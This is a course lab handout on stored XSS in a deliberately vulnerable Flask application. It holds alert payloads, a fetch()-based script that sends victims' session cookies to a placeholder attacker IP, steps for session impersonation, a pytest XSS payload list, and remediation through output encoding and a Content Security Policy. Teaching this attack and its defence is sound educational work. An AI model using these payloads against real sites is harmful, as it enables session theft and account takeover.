# Week 8 Lab — XSS, Bug Bounty, and Automated Testing

**Lecture:** XSS and Testing Web Services with SAST and DAST; Manual Testing and Hardening

---

## Overview

Stored XSS is present in two places: the messaging system renders message bodies with `| safe`, and advising notes do the same. This week you exploit both, escalate to session cookie theft, run OWASP ZAP against the full application, and compare automated tool findings against everything you have found manually across all eight weeks. You will then remediate XSS through output encoding and implement a Content Security Policy.

---

## Tools

| Tool | Purpose |
|------|---------|
| Browser + Developer Tools | Exploit and observe XSS payloads |
| OWASP ZAP | Automated DAST scanning |
| Python HTTP server | Receive exfiltrated cookies |
| pytest | Write automated regression tests for XSS |

**Download OWASP ZAP:** [zaproxy.org](https://www.zaproxy.org/download/)

---

## Steps

### 1. Test Messaging for Stored XSS

Log in as `jsmith`. Navigate to `/messages`. In the **Compose** form, select any recipient and enter the following in the **Message** body:

```html
<script>alert(document.cookie)</script>
```

Send the message. Log in as the recipient in a second browser session and view the inbox. Document whether the script executes and what it displays.

---

### 2. Test Advising Notes for Stored XSS

Log in as `mwilson` (advisor, password: `advisor123`). Navigate to `/messages/advising-notes`. Add a note for student ID 3 with the content:

```html
<img src=x onerror="alert('XSS in advising note: ' + document.cookie)">
```

Log in as `jsmith` and view `/messages/advising-notes`. Document whether the payload executes.

---

### 3. Craft a Cookie-Stealing Payload

Start a simple HTTP server on your machine to receive exfiltrated data:

```bash
python3 -m http.server 8888
```

Craft a payload that sends the victim's session cookie to your server. Replace `YOUR_IP` with your machine's IP address (not `localhost` — the victim's browser makes this request):

```html
<script>
  fetch('http://YOUR_IP:8888/?cookie=' + encodeURIComponent(document.cookie))
</script>
```

Send this as a message from `jsmith` to `alee`. Log in as `alee` and view the inbox. Confirm the cookie arrives at your HTTP server. Paste the server log output in your report.

---

### 4. Combine with Session Impersonation

Using the cookie you just exfiltrated, follow the Week 2 impersonation procedure (manually set the cookie in Developer Tools). Confirm you are now authenticated as `alee`. Document what you can access.

---

### 5. Run OWASP ZAP Active Scan

Open ZAP. In the **Quick Start** tab, set the URL to `http://localhost` and click **Automated Scan**. Let it complete fully.

Export the report: **Report → Generate Report → HTML**.

---

### 6. Compare ZAP Findings to Manual Findings

Create a table with three columns:

| Finding | Found by ZAP | Found Manually (which week) |
|---------|-------------|------------------------------|
| SQL Injection (grades search) | ... | ... |
| Stored XSS (messages) | ... | ... |
| ... | ... | ... |

For findings in only one column, explain why the other method missed it.

---

### 7. Bug Bounty Exercise

Spend 20 minutes looking for any vulnerability not formally assigned in any prior week. This is deliberately open-ended. Document each finding with: endpoint, vulnerability type, proof-of-concept, and a severity rating with justification.

---

### 8. Remediation — Output Encoding

In Jinja2, remove every instance of `| safe` from templates where user-supplied content is rendered. Specifically:

- `messages.html` — the `{{ m.body | safe }}` line
- `advising_notes.html` — the `{{ n.note_content | safe }}` line

Jinja2's auto-escaping will now encode `<script>` as `&lt;script&gt;` before rendering.

Rebuild and verify that Step 1's payload is rendered as escaped text rather than executed.

---

### 9. Implement a Content Security Policy

Add the following header in `nginx/default.conf` inside the HTTPS server block:

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
```

Reload nginx. In Developer Tools → Network, verify the `Content-Security-Policy` header is present on responses.

Re-run Step 3's cookie-stealing payload. Open the browser console and document what error appears.

---

### 10. Write Automated XSS Regression Tests

Create `flask/tests/test_xss.py` using pytest:

```python
import pytest
import requests

BASE = "http://localhost"
PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
]

def login(username, password):
    s = requests.Session()
    s.post(f"{BASE}/login", data={"username": username, "password": password})
    return s

def test_message_body_not_executed():
    session = login("jsmith", "password123")
    # After remediation, post a payload and retrieve the inbox
    # Assert the raw tag is present in the HTML as escaped text
    ...
```

Write three test cases: one for message body XSS, one for advising notes XSS, and one for a URL-reflected parameter. Each test must assert that the raw `<script>` tag is present as escaped HTML entities, not as an executable tag.

---

## Write-Up Questions

**Q1.** Explain the difference between stored XSS, reflected XSS, and DOM-based XSS. Which type did you exploit in Steps 1 and 2? Why is stored XSS considered more severe?

**Q2.** Paste the HTTP server log output from Step 3 showing the exfiltrated cookie. Describe the full attack chain from sending the malicious message to impersonating the victim's session (connecting Steps 3 and 4).

**Q3.** Present your ZAP vs. manual findings table. What categories of vulnerability did ZAP find that you had not found manually? What did you find manually that ZAP missed? What does this say about relying solely on automated scanning?

**Q4.** Explain how Content Security Policy prevents the execution of injected scripts. What is the limitation of CSP as the sole XSS defense?

**Q5.** Document your bug bounty findings. For your most interesting finding, write a formal vulnerability report including: title, severity (with CVSS score justification), affected component, description, steps to reproduce, impact, and recommended remediation.

---

## Hacker Mindset Prompt

XSS is often dismissed as a minor client-side issue. This is a serious underestimation. A committed attacker with arbitrary JavaScript execution in a victim's browser can steal sessions, log keystrokes, capture form submissions, pivot to the local network, and perform any action the victim can perform — silently.

Reflect on:

- **Contrarian:** The developer added `| safe` to the message template to "support rich formatting." What assumption did they make about who would be sending messages, and how did that assumption fail?
- **Committed:** The bug bounty model pays researchers to find vulnerabilities before attackers do. What distinguishes authorized security research from unauthorized access, legally and ethically?
- **Creative:** Your cookie-stealing payload required the victim to load a page containing the payload. What would a more sophisticated attacker do to ensure the payload is executed without the attacker being obviously implicated?
